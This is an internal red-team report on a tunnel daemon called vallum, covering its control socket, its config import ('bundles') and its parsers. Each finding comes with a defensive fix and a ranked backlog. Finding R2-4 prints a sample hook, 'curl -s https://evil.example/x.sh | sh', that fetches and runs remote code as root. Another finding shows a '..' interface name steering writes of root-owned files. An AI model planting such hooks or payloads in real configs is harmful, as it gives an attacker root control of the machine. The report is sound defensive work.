# Red team, round two: the control plane, the parsers, and the bundle

Follows `security-redteam.md`. Round two attacks different surfaces and, per
finding, gives the blue-team answer with its cost. Attacks against the live
deployment are marked.

Round two's theme: **round one broke admission. Round two breaks the things a
user is asked to trust** — the control socket's authority, and the config a
stranger's server hands over.

---

## R2-1 — Anything running as `vallum` takes the tunnel down, and it stays down (medium, live)

`sudo -u vallum vallum stop --control /run/vallum/vallum0.sock` stops the daemon.
Three seconds later the unit reads `inactive` and stays there: `Restart=on-failure`
does not cover a clean exit, so the stop is permanent until someone runs
`systemctl start`.

The authority itself is by design — the control socket belongs to the daemon's
own user, and a peer-table edit or a stop is what it is for. The **recovery gap**
is not: a crash comes back by itself, a controlled stop does not, so the weaker
event has the worse outcome.

### Blue

- **`Restart=always`** in `vallum@.service`, keeping the existing
  `StartLimitIntervalSec=60` / `StartLimitBurst=3` so a crash loop is still
  bounded. `vallum stop` then means "restart me"; a deliberate stop is
  `systemctl stop`, which the operator can already do.
- **Cost**: `vallum stop` loses its "off until I say" meaning. That is the right
  trade — a stop that needs a second command to undo is the surprising one.
- **Follow-on**: `vallum-ops disable` should stop *and* disable in one step, so
  the deliberate path is one verb instead of a rediscovery.

## R2-2 — A hostile server sets the client's local policy, and nothing says so (medium)

`import-bundle` parses the bundle's config and validates it *syntactically*
(`toml::from_str`, then a `Config::load`). It never compares it with the local
defaults. A server can therefore hand over a config with:

- `seccomp = "off"` — the sandbox is silently gone;
- no `user` — the daemon runs as root with no privilege drop;
- `control = "/tmp/somewhere.sock"` — a control socket in a world-writable
  directory, where any local user can reach it (and pre-create it);
- its own `[quick] dns` — every lookup on the client goes where it chooses.

All of those are legal configs. None of them is reported. The client's operator
believes the import is just an address and a key.

### Blue

- **`import-bundle` prints an effective-policy block** before it writes anything:
  sandbox mode, whether privileges drop and to whom, the control path's
  directory ownership, and the DNS servers — each flagged when it is weaker than
  the local default rather than against a hardcoded list.
- **`--strict` refuses** a bundle with a weaker setting, for operators who want
  the default and nothing else.
- **Cost**: one screen of output on import, which the operator already expects
  when handing a stranger's file to a root daemon.
- **Second half**: a control path outside `/run/vallum` should be a warning even
  in non-strict mode, because it is the one that lets *other local users* in.

## R2-4 — A bundle is root code execution, and nothing said so (critical, fixed)

`[quick] pre_up` / `post_up` / `post_down` are shell commands. `vallum-quick`
runs each with `sh -c <hook>` **as root**, from the config, at attach
(`crates/vallum-quick/src/hooks.rs:101`). A bundle carries the config verbatim,
so `import-bundle` writes a file whose next attach executes:

```toml
[quick]
pre_up = ["curl -s https://evil.example/x.sh | sh"]
```

The import path mentioned hooks nowhere. This is strictly worse than R2-2: R2-2
lets a server choose a weaker *setting*, this lets a server run a *program* as
root on the client, and it needs no further interaction after the operator
imports a file they were told is "an address and a key".

The attacker needs to get a bundle in front of the operator — the same
precondition as every supply-chain attack, and the reason bundles exist.

### Blue

**Refuse by default, not warn.** `import_with_policy` rejects any bundle carrying
hooks; `--allow-hooks` accepts one for an operator who wrote them. A warning
printed next to a root `sh -c` is not a control, which is why this departs from
ADR-0033's "report and let `--strict` refuse" for every other finding.

Verified: the crafted bundle above is refused with the reason and the way out,
and accepted with `--allow-hooks`.

### Follow-on, not done

Hooks are still the strongest thing a *local* config can do, and a local config
is written by root. If hooks ever become settable by the control socket, that is
a new decision.

## R2-5 — A config's interface name reaches root-owned file paths unvalidated (low)

`materialize` takes `interface` straight from `config.interface.name`
(`vallum-quick/src/main.rs:242`), and `log_path`/`ready_path` join it into
`/run/vallum`. A name containing `..` therefore creates or truncates a root-owned
file outside `/run/vallum` — bounded by the fixed `.quick-ns.log` /
`.quick-ns.ready` suffixes, which is why this is low and not critical: the
attacker cannot name the target file freely, only the directory.

### Blue

Validate the name at config load: `[A-Za-z0-9_.-]{1,15}`, no `/`, no leading
`-`. The kernel would reject a bad name later anyway; the file writes happen
first.

## R2-3 — The DAC rule is only visible after it bites (low)

`private_key = "/etc/shadow"` is a legal config and fails with
`read key file /etc/shadow: Permission denied` — because the unit's capability
bounding set has no `CAP_DAC_OVERRIDE`, root is only root for files it owns. The
hint added in `b185463` fires and names the mode, owner and fix, which is the
outcome this round wanted to check. It is listed because the rule is not written
down anywhere an operator reads *before* hitting it.

### Blue

- Put the rule in `docs/deployment/server.md` and `client.md`: **every file the
  daemon reads must be owned by the user it runs as**, and `install.sh` is
  responsible for that. The hint stays as the backstop.
- **Cost**: none. This is a documentation defect with a security-adjacent
  symptom.

## Held up, and worth saying so

- **TOML diagnostics are genuinely good.** `sandbox = "off"` produces
  `unknown field 'sandbox', expected one of …` with every valid key listed;
  a missing `private_key` points at `[interface]`. A hostile bundle gets a
  readable failure, not a mystery.
- **Reassembly has the right shape.** The table is bounded three ways: 16
  entries × a validated `MAX_HANDSHAKE_MESSAGE` (256 KiB ceiling), a timeout
  shorter than the 5 s retransmit so an abandoned attempt cannot hold a slot
  into the next one, and **the longest-waiting entry makes room** — a live
  handshake is refreshed by every fragment, so it is never the oldest. Starving
  a peer's reassembly needs more than filling the table.
- **Bundle path traversal is closed** (name reduced to `[A-Za-z0-9_-]`, key must
  be a bare name).
- **`getrandom` is in the seccomp allow-list**, so no sandbox-induced RNG
  starvation.

## Not attacked, still

Source spoofing (cannot set it up from this host), the TCP carrier, the IPv6
path, fuzzing of the bundle reader or the TOML surface, and the `[quick]`
attach path (which runs as root and rewrites `resolv.conf`).

## Ranked blue backlog from both rounds

1. **R2-4** — fixed; the worst finding in either round.
2. **R2-1** — fixed; one line in a unit file, removes a permanent-outage class.
3. **ADR-0030/0032 already landed** — the replay amplifier (round one, H1).
4. **R2-2** — half 1 landed; half 2 (signed manifest) is ADR-0033's open end.
5. **R2-5** — name validation, cheap and mechanical.
4. **M4 production pinning** (ADR-0029) — before any host with a second user.
5. **R2-3** — the DAC rule in the deployment docs.
6. **XDP admission** (ADR-0032's successor) — the only way past the 6.5 µs
   kernel floor.
